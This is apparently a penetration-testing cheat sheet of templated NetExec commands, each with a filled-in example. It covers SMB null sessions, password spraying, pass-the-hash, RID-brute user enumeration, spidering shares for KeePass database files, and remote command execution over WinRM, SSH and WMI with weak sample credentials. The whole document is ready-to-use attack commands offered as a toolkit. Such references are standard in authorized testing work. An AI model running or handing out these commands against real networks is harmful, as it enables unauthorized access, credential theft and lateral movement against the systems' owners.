
---
Description :
     NetExec SMB — null session + shares

Parameters : #target-ip

```cmd
netexec smb {{target-ip}} -u '' -p ''
```

```example
netexec smb 10.10.10.10 -u '' -p ''
```

Tags :  #linux #netexec #smb #crackmapexec #toolkit

---

Description :
     NetExec SMB — password spray user list

Parameters : #target-ip #user-file #password

```cmd
netexec smb {{target-ip}} -u {{user-file}} -p '{{password}}' --continue-on-success
```

```example
netexec smb 10.10.10.10 -u users.txt -p 'Spring2024!' --continue-on-success
```

Tags :  #linux #netexec #smb #toolkit

---

Description :
     NetExec SMB — pass-the-hash

Parameters : #target-ip #username #hash

```cmd
netexec smb {{target-ip}} -u {{username}} -H {{hash}}
```

```example
netexec smb 10.10.10.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:...
```

Tags :  #linux #netexec #smb #pth #toolkit

---

Description :
     NetExec SMB — enumerate users RID brute

Parameters : #target-ip #username #password

```cmd
netexec smb {{target-ip}} -u {{username}} -p '{{password}}' --rid-brute
```

```example
netexec smb 10.10.10.10 -u guest -p '' --rid-brute
```

Tags :  #linux #netexec #smb #enum #toolkit

---

Description :
     NetExec SMB — spider share for filename pattern

Parameters : #target-ip #username #password #file

```cmd
netexec smb {{target-ip}} -u {{username}} -p '{{password}}' -M spider_plus -o READ_ONLY=false -o EXTENSIVE_SEARCH=true -o PATTERN={{file}}
```

```example
netexec smb 10.10.10.10 -u u -p p -M spider_plus -o PATTERN=*.kdbx
```

Tags :  #linux #netexec #smb #toolkit

---

Description :
     NetExec WinRM — command execution

Parameters : #target-ip #username #password

```cmd
netexec winrm {{target-ip}} -u {{username}} -p '{{password}}' -x "whoami"
```

```example
netexec winrm 10.10.10.10 -u admin -p 'x' -x "whoami"
```

Tags :  #linux #netexec #winrm #toolkit

---

Description :
     NetExec LDAP — whoami readable

Parameters : #target-ip #username #password

```cmd
netexec ldap {{target-ip}} -u {{username}} -p '{{password}}' --users
```

```example
netexec ldap 10.10.10.10 -u guest -p '' --users
```

Tags :  #linux #netexec #ldap #ad #toolkit

---

Description :
     NetExec SSH — exec one command

Parameters : #target-ip #username #password

```cmd
netexec ssh {{target-ip}} -u {{username}} -p '{{password}}' -x "id"
```

```example
netexec ssh 10.10.10.10 -u root -p 'toor' -x "id"
```

Tags :  #linux #netexec #ssh #toolkit

---

Description :
     NetExec MSSQL — test login

Parameters : #target-ip #username #password

```cmd
netexec mssql {{target-ip}} -u {{username}} -p '{{password}}'
```

```example
netexec mssql 10.10.10.10 -u sa -p 'Password1!'
```

Tags :  #linux #netexec #mssql #toolkit

---

Description :
     NetExec WMI — command

Parameters : #target-ip #username #password

```cmd
netexec wmi {{target-ip}} -u {{username}} -p '{{password}}' -x "hostname"
```

```example
netexec wmi 10.10.10.10 -u .\admin -p 'x' -x "hostname"
```

Tags :  #linux #netexec #wmi #toolkit

---
